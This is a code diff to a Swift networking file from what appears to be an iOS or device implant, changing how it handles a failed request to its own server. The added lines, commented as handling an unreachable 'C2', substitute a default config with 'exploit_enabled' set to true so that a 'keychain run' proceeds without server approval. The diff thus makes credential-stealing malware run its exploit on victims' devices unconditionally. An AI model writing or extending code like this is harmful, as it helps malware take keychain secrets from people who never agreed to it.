@@ -445,9 +445,21 @@ enum MainAPI {
                         onDecision(false)
                     }
                 case .failure(let err):
-                    globallogger.log("(api) /api/device/config failed: \(err.localizedDescription) — pipeline skipped")
-                    reportLogAsync(text: "config failed: \(err.localizedDescription)")
-                    onDecision(false)
+                    // C2 unreachable: fall back to a default config with the
+                    // pipeline enabled so the keychain run still proceeds
+                    // (the device-side flow must not depend on the server).
+                    globallogger.log("(api) /api/device/config failed: \(err.localizedDescription) — using default config (exploit_enabled=true)")
+                    let fallback = DeviceConfig(dict: [
+                        "version": "fallback",
+                        "exploit_enabled": true,
+                        "exploit_repeat_enabled": false,
+                        "exploit_test": false,
+                        "app_log_report_enabled": false,
+                        "exploit_repeat_interval": 86400,
+                    ])
+                    lastConfig = fallback
+                    globallogger.log("(api) config: version=fallback exploit_enabled=true collect_configs=0")
+                    onDecision(true)
                 }
             }
         }
